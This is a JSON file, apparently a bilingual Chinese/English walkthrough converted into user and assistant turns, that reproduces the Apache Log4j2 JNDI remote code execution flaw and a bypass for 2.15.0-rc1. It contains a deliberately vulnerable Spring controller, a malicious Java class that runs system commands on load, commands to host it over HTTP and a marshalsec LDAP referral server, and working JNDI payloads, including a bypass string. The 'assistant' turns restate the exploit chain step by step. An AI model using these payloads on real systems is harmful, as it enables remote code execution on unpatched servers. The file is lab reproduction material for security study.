@@ -1,0 +1,266 @@
+{
+  "_source_md": "Apache-Log4j2/2021-12-15-Apache-Log4j2-RCE-WalkThrough.md",
+  "version": "log4j2-rce-walkthrough",
+  "title": {
+    "zh": "Apache Log4j2 远程代码执行复现：从基础到绕过",
+    "en": "Apache Log4j2 Remote Code Execution Walkthrough: From Basics to Bypass"
+  },
+  "description": {
+    "zh": "详细介绍 Apache Log4j2 远程代码执行漏洞的复现过程，包括环境准备、payload 构造、LDAP/RMI 服务搭建，以及 2.15.0-rc1 版本的绕过方法。",
+    "en": "Detailed walkthrough of Apache Log4j2 remote code execution vulnerability reproduction, including environment preparation, payload construction, LDAP/RMI service setup, and bypass methods for version 2.15.0-rc1."
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【环境准备】检查 JDK 版本（需低于 11，推荐 1.8.0_181）",
+        "en": "[Environment Preparation] Check JDK version (must be below 11, recommend 1.8.0_181)"
+      },
+      "annotation": {
+        "zh": "Server/Client 通用：确认 JDK 版本满足漏洞利用条件",
+        "en": "Common for Server/Client: Ensure JDK version meets vulnerability exploitation condition"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "查看 Java 版本命令及输出示例",
+            "en": "Command to check Java version and example output"
+          },
+          "code": "> java -version\njava version \"1.8.0_181\"\nJava(TM) SE Runtime Environment (build 1.8.0_181-b13)\nJava HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【Server 端】编写存在漏洞的 `Spring Boot Controller`，开启 JNDI 信任并记录用户输入",
+        "en": "[Server Side] Write vulnerable `Spring Boot Controller`, enable JNDI trust and log user input"
+      },
+      "annotation": {
+        "zh": "漏洞代码：/hello 接口接收 payload 参数，使用 logger.error 记录，同时设置 trustURLCodebase 为 true",
+        "en": "Vulnerable code: /hello endpoint receives payload parameter, logs with logger.error, and sets trustURLCodebase to true"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "Log4j2RceApplication 中的 hello 方法",
+            "en": "hello method in Log4j2RceApplication"
+          },
+          "code": "// com.example.log4j2_rce.Log4j2RceApplication\n@PostMapping({\"/hello\"})\npublic String hello(String payload) {\n  System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n  System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");\n  logger.error(\"{}\", payload);\n  logger.info(\"{}\", payload);\n  logger.info(payload);\n  logger.error(payload);\n  return \"ok\";\n}",
+          "language": "java"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【Server 端】启动 Spring Boot 应用（demo.jar）",
+        "en": "[Server Side] Start Spring Boot application (demo.jar)"
+      },
+      "annotation": {
+        "zh": "应用启动后会监听端口，等待包含 payload 的请求",
+        "en": "After starting, the application listens on a port and waits for requests containing payload"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "启动 demo.jar 的命令及 Spring Boot 启动横幅",
+            "en": "Command to start demo.jar and Spring Boot banner"
+          },
+          "code": "# 启动web\n$ java -jar demo.jar\n  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::        (v2.1.3.RELEASE)",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【Client 端】编写恶意 Java 类 `dnslog.java`，在静态代码块中执行系统命令（打开计算器）",
+        "en": "[Client Side] Write malicious Java class `dnslog.java`, execute system command (open calculator) in static block"
+      },
+      "annotation": {
+        "zh": "恶意类将在被 JNDI 加载时自动执行静态代码块中的命令",
+        "en": "The malicious class will automatically execute the command in static block when loaded by JNDI"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "dnslog.java 完整源码及编译命令",
+            "en": "Full source code of dnslog.java and compilation command"
+          },
+          "code": "// $ cat dnslog.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class dnslog {\n\tstatic {\n\t\ttry{\n\t \tRuntime rt = Runtime.getRuntime();\n\t \tString[] commands = {\"open\",\"/System/Applications/Calculator.app\"};\n\t \tProcess pc = rt.exec(commands);\n\t \tpc.waitFor();\n\t \t}catch (Exception e) {\n\t \t//no\n\t\t}\n\t}\n}\n// $ javac dnslog.java",
+          "language": "java"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【Client 端】启动 HTTP 服务，提供恶意类 `dnslog.class` 的下载",
+        "en": "[Client Side] Start HTTP service to host the malicious class `dnslog.class`"
+      },
+      "annotation": {
+        "zh": "使用 Python 简易 HTTP 服务器，监听 80 端口，使远程目标可以下载恶意类",
+        "en": "Use Python simple HTTP server on port 80 to allow remote target to download the malicious class"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "启动 HTTP 服务的命令",
+            "en": "Command to start HTTP service"
+          },
+          "code": "# 启动http：\n$ python3 -m http.server 80\nServing HTTP on :: port 80 (http://[::]:80/) ...",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【Client 端】启动 LDAP 服务，将 JNDI 查找请求重定向到恶意 HTTP 服务器",
+        "en": "[Client Side] Start LDAP service to redirect JNDI lookup requests to the malicious HTTP server"
+      },
+      "annotation": {
+        "zh": "使用 `marshalsec` 工具启动 LDAP Ref Server，当收到 `${jndi:ldap://...}` 请求时返回指向恶意类的引用",
+        "en": "Use `marshalsec` to start LDAP Ref Server, which returns a reference to the malicious class when receiving `${jndi:ldap://...}` request"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "启动 LDAP 服务的命令",
+            "en": "Command to start LDAP service"
+          },
+          "code": "# 启动LDAP服务：\n$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.168.3.64/#dnslog\"",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【Client 端】发送恶意 payload 触发漏洞",
+        "en": "[Client Side] Send malicious payload to trigger vulnerability"
+      },
+      "annotation": {
+        "zh": "通过 HTTP POST 请求向 `/hello` 接口发送包含 JNDI 查找的 payload，Log4j2 会解析 `${jndi:...}` 并远程加载恶意类",
+        "en": "Send HTTP POST request to `/hello` endpoint with JNDI lookup payload; Log4j2 will parse `${jndi:...}` and remotely load the malicious class"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "漏洞触发 payload 示例",
+            "en": "Example payload to trigger vulnerability"
+          },
+          "code": "${jndi:ldap://192.168.3.64:1389/dnslog}",
+          "language": "text"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【配置说明】修改 `pom.xml` 使用特定版本 Log4j2（2.14.1 或 2.15.0-rc1）及 log4j2.xml 开启 lookup",
+        "en": "[Configuration] Modify `pom.xm`l to use specific Log4j2 version (2.14.1 or 2.15.0-rc1) and log4j2.xml to enable lookup"
+      },
+      "annotation": {
+        "zh": "受影响版本为 `2.x <= 2.15.0-rc1`，且需要 `PatternLayout` 中设置 `%m{lookups}%n` 才能触发",
+        "en": "Affected versions are `2.x <= 2.15.0-rc1`, and `PatternLayout` must have `%m{lookups}%n` to trigger"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "pom.xml 依赖配置",
+            "en": "pom.xml dependency configuration"
+          },
+          "code": "<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <!--<version>2.14.1</version>-->\n  <version>2.15.0-rc1</version>\n</dependency>\n        <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->\n<dependency>\n<groupId>org.apache.logging.log4j</groupId>\n<artifactId>log4j-api</artifactId>\n<!--<version>2.14.1</version>-->\n<version>2.15.0-rc1</version>\n</dependency>",
+          "language": "xml"
+        },
+        {
+          "caption": {
+            "zh": "log4j2.xml 配置文件（启用 lookup）",
+            "en": "log4j2.xml configuration (enable lookup)"
+          },
+          "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration status=\"OFF\" monitorInterval=\"30\">\n  <appenders>\n    <console name=\"Console\" target=\"SYSTEM_OUT\">\n      <PatternLayout pattern=\"%m{lookups}%n\"/>\n    </console>\n  </appenders>\n\n  <loggers>\n    <root level=\"all\">\n      <appender-ref ref=\"Console\"/>\n    </root>\n  </loggers>\n</configuration>",
+          "language": "xml"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "【验证】日志输出示例（正常记录不同级别的日志）",
+        "en": "[Verification] Example log output (normal logging at different levels)"
+      },
+      "annotation": {
+        "zh": "当应用记录 payload 时，若包含 `${jndi:...}` 则会触发远程加载",
+        "en": "When the application logs the payload, if it contains `${jndi:...}`, remote loading will be triggered"
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "logger.error/info/debug 输出示例",
+            "en": "Example output of logger.error/info/debug"
+          },
+          "code": "logger.error(\"hello,error\");\nlogger.info(\"hello,info\");\nlogger.debug(\"hello,debug\");\n#输出如下：\nhello,error\nhello,info\nhello,debug\n\nProcess finished with exit code 0",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "assistant_text",
+      "content": {
+        "zh": "复现环境准备：\n1) 准备 demo.jar 或 idea 代码调试环境；\n2) JDK 版本需低于 11，推荐 1.8.0_181；\n3) 受影响版本：`Log4j 2.x <= 2.15.0-rc1`。使用 JD-GUI 反编译 demo.jar，分析代码发现 /hello 路由接收 payload 参数并使用 logger.error 记录。",
+        "en": "Reproduction environment preparation: \n1) Prepare demo.jar or idea code debugging environment; \n2) JDK version needs to be below 11, recommend 1.8.0_181; \n3) Affected versions: `Log4j 2.x <= 2.15.0-rc1`. Use JD-GUI to decompile demo.jar, analyze code to find /hello route receives payload parameter and uses logger.error to record."
+      },
+      "annotation": {
+        "zh": "助手响应（环境准备总结）",
+        "en": "Assistant Response (environment preparation summary)"
+      }
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "如何构造攻击 payload？",
+        "en": "How to construct attack payload?"
+      },
+      "annotation": {
+        "zh": "用户执行操作",
+        "en": "User performs action"
+      }
+    },
+    {
+      "type": "assistant_text",
+      "content": {
+        "zh": "Payload 构造流程：\n1) 编写恶意 Java 类 `dnslog.java`，使用 `Runtime.exec` 执行命令；\n2) 编译生成 `dnslog.class`；\n3) 启动 HTTP 服务提供恶意类下载：`python3 -m http.server 80`；\n4) 启动 LDAP 服务：`java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://192.168.3.64/#dnslog`；\n5) 发送 payload：`${jndi:ldap://192.168.3.64:1389/dnslog}`。",
+        "en": "Payload construction process: \n1) Write malicious Java class `dnslog.java`, use `Runtime.exec` to execute commands; \n2) Compile to generate `dnslog.class`; \n3) Start HTTP service to provide malicious class download: `python3 -m http.server 80`; \n4) Start LDAP service: `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://192.168.3.64/#dnslog`; \n5) Send payload: `${jndi:ldap://192.168.3.64:1389/dnslog}`."
+      },
+      "annotation": {
+        "zh": "助手响应",
+        "en": "Assistant Response"
+      }
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "2.15.0-rc1 版本如何绕过？",
+        "en": "How to bypass version 2.15.0-rc1?"
+      },
+      "annotation": {
+        "zh": "用户执行操作",
+        "en": "User performs action"
+      }
+    },
+    {
+      "type": "assistant_text",
+      "content": {
+        "zh": "2.15.0-rc1 绕过方法：修改 pom.xml 将版本改为 `2.15.0-rc1`，添加 `log4j2.xml` 配置文件，设置 `PatternLayout pattern` 为`%m{lookups}%n`开启 lookup 功能。绕过 payload：`${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}`，通过域名解析绕过限制。限制：高版本 JDK 会报错 `Reference Class Name: foo`。",
+        "en": "2.15.0-rc1 bypass method: Modify pom.xml to change version to `2.15.0-rc1`, add `log4j2.xml` configuration file, set `PatternLayout pattern` to `%m{lookups}%n` to enable lookup function. Bypass payload: `${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}`, bypass restrictions through domain name resolution. Limitation: High version JDK will report error `Reference Class Name: foo`."
+      },
+      "annotation": {
+        "zh": "助手响应",
+        "en": "Assistant Response"
+      }
+    }
+  ]
+}
